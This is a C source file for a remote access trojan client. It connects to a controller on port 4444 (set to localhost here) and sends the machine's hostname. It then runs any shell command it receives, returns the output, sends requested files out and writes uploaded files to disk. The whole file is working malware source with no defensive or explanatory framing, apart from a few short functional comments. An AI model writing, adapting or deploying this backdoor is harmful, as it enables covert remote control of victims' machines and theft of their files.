#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/utsname.h>
#include <sys/stat.h>
#include <dirent.h>
#include <errno.h>
#include <sys/wait.h>
#include <pwd.h>

#ifdef _WIN32
    #include <windows.h>
    #include <direct.h>
    #define getcwd _getcwd
    #define chdir _chdir
#else
    #include <sys/utsname.h>
#endif

#define PORT 4444
#define BUFFER_SIZE 4096
#define MAX_COMMAND_SIZE 1024

typedef struct {
    char host[16];
    int port;
    int client_fd;
    struct sockaddr_in server_addr;
    char current_dir[1024];
    char os_type[32];
    char username[256];
    char hostname[256];
} RAT_CLIENT;

// Function to detect the operating system
void detect_os(RAT_CLIENT *client) {
#ifdef _WIN32
    strcpy(client->os_type, "Windows");
#else
    strcpy(client->os_type, "Linux");
#endif
}

// Function to get current username
void get_username(RAT_CLIENT *client) {
#ifdef _WIN32
    DWORD username_len = sizeof(client->username);
    GetUserName(client->username, &username_len);
#else
    struct passwd *pw = getpwuid(getuid());
    if (pw) {
        strcpy(client->username, pw->pw_name);
    } else {
        strcpy(client->username, "unknown");
    }
#endif
}

// Function to generate OS-appropriate prompt
void generate_prompt(RAT_CLIENT *client, char *prompt, size_t prompt_size) {
    if (strcmp(client->os_type, "Windows") == 0) {
        snprintf(prompt, prompt_size, "%s>", client->current_dir);
    } else {
        // Linux/Unix style: [user@hostname dir]$
        char *dir_name = strrchr(client->current_dir, '/');
        if (dir_name) {
            dir_name++; // Skip the '/'
        } else {
            dir_name = client->current_dir;
        }
        
        if (strlen(dir_name) == 0) {
            dir_name = "/";
        }
        
        snprintf(prompt, prompt_size, "[%s@%s %s]$ ", 
                client->username, client->hostname, dir_name);
    }
}

int connect_to_server(RAT_CLIENT *client) {
    // Create socket
    if ((client->client_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket creation failed");
        return -1;
    }
    
    client->server_addr.sin_family = AF_INET;
    client->server_addr.sin_port = htons(client->port);
    
    if (inet_pton(AF_INET, client->host, &client->server_addr.sin_addr) <= 0) {
        perror("Invalid address");
        return -1;
    }
    
    // Connect to server
    if (connect(client->client_fd, (struct sockaddr *)&client->server_addr, 
                sizeof(client->server_addr)) < 0) {
        perror("Connection failed");
        return -1;
    }
    
    // Initialize OS and user information
    detect_os(client);
    get_username(client);
    
    // Get hostname
    if (gethostname(client->hostname, sizeof(client->hostname)) != 0) {
        strcpy(client->hostname, "unknown");
    }
    
    // Send hostname to server for compatibility
    send(client->client_fd, client->hostname, strlen(client->hostname), 0);
    
    // Get current directory
    if (getcwd(client->current_dir, sizeof(client->current_dir)) == NULL) {
        strcpy(client->current_dir, "/");
    }
    
    return 0;
}

void send_response(RAT_CLIENT *client, const char *response) {
    send(client->client_fd, response, strlen(response), 0);
}

void send_response_with_prompt(RAT_CLIENT *client, const char *response) {
    char prompt[512];
    char full_response[BUFFER_SIZE * 4];
    
    // Update current directory in case it changed
    if (getcwd(client->current_dir, sizeof(client->current_dir)) == NULL) {
        strcpy(client->current_dir, "/");
    }
    
    generate_prompt(client, prompt, sizeof(prompt));
    
    // Send response followed by prompt on a new line
    if (strlen(response) > 0) {
        snprintf(full_response, sizeof(full_response), "%s\n%s", response, prompt);
    } else {
        snprintf(full_response, sizeof(full_response), "%s", prompt);
    }
    
    send(client->client_fd, full_response, strlen(full_response), 0);
}

void execute_shell_command(RAT_CLIENT *client, const char *command) {
    FILE *fp;
    char buffer[BUFFER_SIZE];
    char result[BUFFER_SIZE * 4] = {0};
    
    // Handle cd command specially to update current directory
    if (strncmp(command, "cd ", 3) == 0) {
        const char *path = command + 3;
        // Trim whitespace from path
        while (*path == ' ') path++;
        
        if (strlen(path) == 0 || strcmp(path, "~") == 0) {
            // cd with no args or ~ goes to home directory
            const char *home = getenv("HOME");
            if (home && chdir(home) == 0) {
                strcpy(client->current_dir, home);
                send_response_with_prompt(client, "");
                return;
            }
        } else if (chdir(path) == 0) {
            if (getcwd(client->current_dir, sizeof(client->current_dir)) != NULL) {
                send_response_with_prompt(client, "");
                return;
            }
        }
        // If cd failed, show error and current prompt
        send_response_with_prompt(client, "cd: No such file or directory");
        return;
    }
    
    fp = popen(command, "r");
    if (fp == NULL) {
        send_response_with_prompt(client, "Error: Failed to execute command");
        return;
    }
    
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strcat(result, buffer);
    }
    
    pclose(fp);
    
    // Remove trailing newline for cleaner output
    if (strlen(result) > 0 && result[strlen(result) - 1] == '\n') {
        result[strlen(result) - 1] = '\0';
    }
    
    send_response_with_prompt(client, result);
}

void handle_download(RAT_CLIENT *client, const char *filename) {
    FILE *file;
    char buffer[BUFFER_SIZE];
    size_t bytes_read;
    
    file = fopen(filename, "rb");
    if (file == NULL) {
        send_response_with_prompt(client, "Error: Cannot open file for download");
        return;
    }
    
    // Send file content
    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
        send(client->client_fd, buffer, bytes_read, 0);
    }
    
    fclose(file);
}

void handle_upload(RAT_CLIENT *client) {
    FILE *file;
    char filename[256];
    char buffer[BUFFER_SIZE];
    int bytes_received;
    
    // Receive filename
    memset(filename, 0, sizeof(filename));
    bytes_received = recv(client->client_fd, filename, sizeof(filename) - 1, 0);
    if (bytes_received <= 0) {
        return;
    }
    filename[bytes_received] = '\0';
    
    file = fopen(filename, "wb");
    if (file == NULL) {
        return;
    }
    
    // Receive file content
    while ((bytes_received = recv(client->client_fd, buffer, BUFFER_SIZE, 0)) > 0) {
        fwrite(buffer, 1, bytes_received, file);
        if (bytes_received < BUFFER_SIZE) {
            break; // End of file
        }
    }
    
    fclose(file);
}

void execute_commands(RAT_CLIENT *client) {
    char command[MAX_COMMAND_SIZE];
    char *args[10];
    char *token;
    int arg_count;
    int bytes_received;
    char prompt[512];
    
    // Send initial prompt to server
    generate_prompt(client, prompt, sizeof(prompt));
    send_response(client, prompt);
    
    while (1) {
        // Receive command from server
        memset(command, 0, sizeof(command));
        bytes_received = recv(client->client_fd, command, sizeof(command) - 1, 0);
        
        if (bytes_received <= 0) {
            break; // Connection lost
        }
        
        command[bytes_received] = '\0';
        
        // Parse command
        arg_count = 0;
        char command_copy[MAX_COMMAND_SIZE];
        strcpy(command_copy, command);
        token = strtok(command_copy, " ");
        while (token != NULL && arg_count < 9) {
            args[arg_count++] = token;
            token = strtok(NULL, " ");
        }
        args[arg_count] = NULL;
        
        if (arg_count == 0) {
            // Send empty prompt for empty commands
            generate_prompt(client, prompt, sizeof(prompt));
            send_response(client, prompt);
            continue;
        }
        
        // Handle special commands
        if (strcmp(args[0], "download") == 0) {
            if (arg_count > 1) {
                handle_download(client, args[1]);
                // Send confirmation prompt after download
                send_response_with_prompt(client, "File sent for download");
            } else {
                send_response_with_prompt(client, "Error: No filename specified");
            }
        }
        else if (strcmp(args[0], "upload") == 0) {
            handle_upload(client);
            // Send confirmation prompt after upload
            send_response_with_prompt(client, "File upload completed");
        }
        else if (strcmp(args[0], "exit") == 0) {
            send_response(client, "Goodbye!");
            break;
        }
        else {
            // Execute everything else as native OS command
            execute_shell_command(client, command);
        }
    }
}

void cleanup(RAT_CLIENT *client) {
    if (client->client_fd > 0) {
        close(client->client_fd);
    }
}

int main() {
    RAT_CLIENT client;
    
    // Initialize client
    strcpy(client.host, "127.0.0.1");
    client.port = PORT;
    client.client_fd = -1;
    
    if (connect_to_server(&client) < 0) {
        cleanup(&client);
        return 1;
    }
    
    printf("Connected to server at %s:%d\n", client.host, client.port);
    
    execute_commands(&client);
    
    cleanup(&client);
    return 0;
}